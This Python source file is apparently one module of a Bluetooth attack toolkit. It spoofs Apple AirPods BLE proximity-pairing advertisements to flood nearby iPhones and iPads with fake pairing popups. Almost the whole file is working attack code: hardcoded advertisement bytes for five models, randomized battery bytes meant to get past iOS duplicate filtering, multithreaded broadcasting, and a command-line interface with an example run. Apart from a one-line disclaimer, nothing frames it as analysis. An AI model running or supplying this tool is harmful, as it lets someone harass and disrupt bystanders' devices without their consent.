"""
AirPods BLE Advertisement Spammer

This script broadcasts fake Apple AirPods BLE advertisements to nearby iOS devices.
It exploits Apple's proximity pairing protocol by sending spoofed advertisement packets
that trigger pairing popups on iPhones and iPads.

WARNING: This is for educational purposes only. Use responsibly and only on devices
you own or have permission to test.
"""

import time
import random
import threading
import argparse
import bluetooth._bluetooth as bluez
from .bluetooth_utils import toggle_device, start_le_advertising, stop_le_advertising


# AirPods model advertisement base data
# The byte at index 7 (after 0x07, 0x19, 0x07) identifies the model type
AIRPODS_MODELS = {
    "AirPods": (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45),
    "AirPods Pro": (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45),
    "AirPods Max": (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45),
    "AirPods Gen 2": (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45),
    "AirPods Gen 3": (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45),
}

# Static data suffix for all AirPods advertisements
DATA_SUFFIX = (0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a)


def generate_random_battery_data(base_data, data_suffix):
    """
    Generate advertisement data with randomized battery levels.
    
    This creates realistic-looking battery data to make each advertisement
    appear unique, preventing iOS from filtering duplicate packets.
    
    Args:
        base_data (tuple): Base advertisement data for the AirPods model.
        data_suffix (tuple): Static suffix data.
    
    Returns:
        tuple: Complete advertisement packet with random battery levels.
    """
    # Random battery levels for left earbud, right earbud, and case
    left_battery = (random.randint(1, 100),)
    right_battery = (random.randint(1, 100),)
    case_battery = (random.randint(128, 228),)  # Higher range for case encoding
    
    return base_data + left_battery + right_battery + case_battery + data_suffix


def advertise_airpods(device_ids, model_name, base_data, data_suffix, interval, duration):
    """
    Continuously advertise a specific AirPods model for a given duration.
    
    Args:
        device_ids (list): List of HCI device identifiers (e.g., ["hci0", "hci1"]).
        model_name (str): Name of the AirPods model being advertised.
        base_data (tuple): Base advertisement data for this model.
        data_suffix (tuple): Static suffix data appended to advertisements.
        interval (int): Advertising interval in milliseconds.
        duration (int): How long to advertise in seconds.
    """
    sockets = []
    
    try:
        # Open HCI sockets for each Bluetooth adapter
        for dev_id in device_ids:
            sock = bluez.hci_open_dev(int(dev_id.replace("hci", "")))
            sockets.append(sock)
        
        end_time = time.time() + duration
        
        while time.time() < end_time:
            # Generate new packet with random battery data
            adv_data = generate_random_battery_data(base_data, data_suffix)
            
            print(f"[{model_name}] Broadcasting advertisement (battery data randomized)")
            
            # Send advertisement on all adapters
            for sock in sockets:
                start_le_advertising(
                    sock,
                    adv_type=0x03,  # ADV_NONCONN_IND (non-connectable)
                    min_interval=interval,
                    max_interval=interval,
                    data=adv_data
                )
            
            # Wait for the interval duration
            time.sleep(interval / 1000.0)
    
    except Exception as e:
        print(f"[{model_name}] Error: {e}")
    
    finally:
        # Clean up - stop advertising on all sockets
        for sock in sockets:
            try:
                stop_le_advertising(sock)
            except:
                pass


def airpods_spam(device_ids, interval=200, num_models=5, duration=60):
    """
    Main function to spam multiple AirPods advertisements simultaneously.
    
    This function creates multiple threads, each broadcasting a different
    AirPods model, to flood nearby iOS devices with pairing requests.
    
    Args:
        device_ids (list): List of HCI device identifiers (e.g., ["hci0"]).
        interval (int): Advertising interval in milliseconds (default: 200).
        num_models (int): Number of AirPods models to spam (default: 5, max: 5).
        duration (int): Duration to run the spam in seconds (default: 60).
    """
    print(f"\n{'='*60}")
    print(f"AirPods BLE Spam Attack")
    print(f"{'='*60}")
    print(f"Devices: {', '.join(device_ids)}")
    print(f"Models: {num_models}")
    print(f"Interval: {interval}ms")
    print(f"Duration: {duration}s")
    print(f"{'='*60}\n")
    
    # Enable all Bluetooth adapters
    for dev_id in device_ids:
        interface_num = int(dev_id.replace("hci", ""))
        toggle_device(interface_num, True)
    
    # Select the specified number of AirPods models
    selected_models = list(AIRPODS_MODELS.items())[:num_models]
    
    # Create and start a thread for each model
    threads = []
    for model_name, base_data in selected_models:
        thread = threading.Thread(
            target=advertise_airpods,
            args=(device_ids, model_name, base_data, DATA_SUFFIX, interval, duration),
            daemon=True
        )
        threads.append(thread)
        thread.start()
        print(f"[STARTED] {model_name} advertising thread")
    
    # Wait for all threads to complete
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\n\n[STOPPED] Attack interrupted by user")
    
    # Disable all Bluetooth adapters
    print("\nCleaning up...")
    for dev_id in device_ids:
        interface_num = int(dev_id.replace("hci", ""))
        toggle_device(interface_num, False)
    
    print("Done!\n")


def main():
    """Command-line interface for the AirPods spam tool."""
    parser = argparse.ArgumentParser(
        description='BLE AirPods Advertisement Spammer',
        epilog='Example: python -m ble.airpods_spam -d hci0 -i 200 -t 5 -D 120'
    )
    
    parser.add_argument(
        '-d', '--devices',
        nargs='+',
        default=['hci0'],
        help='Bluetooth HCI device(s) to use (default: hci0)'
    )
    
    parser.add_argument(
        '-i', '--interval',
        type=int,
        default=200,
        help='Advertising interval in milliseconds (default: 200)'
    )
    
    parser.add_argument(
        '-t', '--threads',
        type=int,
        default=5,
        choices=range(1, 6),
        help='Number of AirPods models to spam (1-5, default: 5)'
    )
    
    parser.add_argument(
        '-D', '--duration',
        type=int,
        default=60,
        help='Duration to run in seconds (default: 60)'
    )
    
    args = parser.parse_args()
    
    # Run the spam attack
    airpods_spam(
        device_ids=args.devices,
        interval=args.interval,
        num_models=args.threads,
        duration=args.duration
    )


if __name__ == '__main__':
    main()
